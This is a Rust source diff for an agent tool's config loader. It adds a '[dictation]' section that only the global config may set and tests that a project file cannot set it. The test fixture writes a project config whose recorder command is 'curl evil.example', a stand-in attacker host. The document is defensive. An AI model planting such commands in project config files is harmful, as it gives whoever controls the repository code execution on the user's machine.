@@ -12,7 +12,7 @@
 //! and `[bash] writable`; a project file may turn `[bash] sandbox` on and `network` off,
 //! never the reverse. `[bash] sudo` likewise: a project file may turn it off, never on.
 //! `[egress]`, the allowlist and secrets of the proxy bash goes out through, is the
-//! global file's alone.
+//! global file's alone. So is `[dictation]`, since it names commands to run.
 //! `web_search` is off unless the global file turns it on, since each search sends the
 //! last two user messages and some of the answers between them to the ChatGPT backend's
 //! undocumented search endpoint; a project file may turn it off. `image_gen` likewise,
@@ -80,6 +80,9 @@ pub struct Config {
     pub sudo: bool,
     /// `[egress]`: the proxy bash goes out through, or `None` for none.
     pub egress: Option<crate::egress::Settings>,
+    /// `[dictation]`: the recorder and transcriber ctrl+space runs, or `None` for none.
+    #[cfg(feature = "dictation")]
+    pub dictation: Option<crate::dictation::Settings>,
 }
 
 impl Default for Config {
@@ -110,6 +113,8 @@ impl Default for Config {
             sandbox: crate::sandbox::Settings::default(),
             sudo: false,
             egress: None,
+            #[cfg(feature = "dictation")]
+            dictation: None,
         }
     }
 }
@@ -200,6 +205,8 @@ struct Layer {
     #[serde(default)]
     bash: BashLayer,
     egress: Option<crate::egress::Settings>,
+    #[cfg(feature = "dictation")]
+    dictation: Option<crate::dictation::Settings>,
     #[serde(default)]
     permissions: RulesLayer,
 }
@@ -384,6 +391,10 @@ impl Config {
             // Where commands may send data, and which secrets ride along, likewise.
             if layer.egress.is_some() {
                 self.egress = layer.egress.clone();
+            }
+            #[cfg(feature = "dictation")]
+            if layer.dictation.is_some() {
+                self.dictation = layer.dictation.clone();
             }
         }
         // A project file may turn the sandbox on and the network off, never the reverse.
@@ -751,6 +762,28 @@ mod tests {
         assert_eq!(secret.command.as_deref().unwrap()[0], "secrets");
 
         write(&global_path(&home), "[egress]\nallowed = []\n");
+        assert!(Config::load(Some(&home), &cwd).is_err());
+        std::fs::remove_dir_all(dir).unwrap();
+    }
+
+    #[cfg(feature = "dictation")]
+    #[test]
+    fn dictation_is_the_global_files_alone() {
+        let dir = temp_dir();
+        let (home, cwd) = (dir.join("home"), dir.join("cwd"));
+        write(
+            &cwd.join(".bhai/config.toml"),
+            "[dictation]\nrecord = [\"curl\", \"evil.example\"]\n",
+        );
+        assert_eq!(Config::load(Some(&home), &cwd).unwrap().dictation, None);
+
+        write(&global_path(&home), "[dictation]\nmodel = \"~/m.bin\"\n");
+        let dictation = Config::load(Some(&home), &cwd).unwrap().dictation.unwrap();
+        assert_eq!(dictation.model.as_deref(), Some("~/m.bin"));
+        assert_eq!(dictation.record[0], "sox");
+        assert_eq!(dictation.transcribe[0], "whisper-cli");
+
+        write(&global_path(&home), "[dictation]\nrecorder = []\n");
         assert!(Config::load(Some(&home), &cwd).is_err());
         std::fs::remove_dir_all(dir).unwrap();
     }
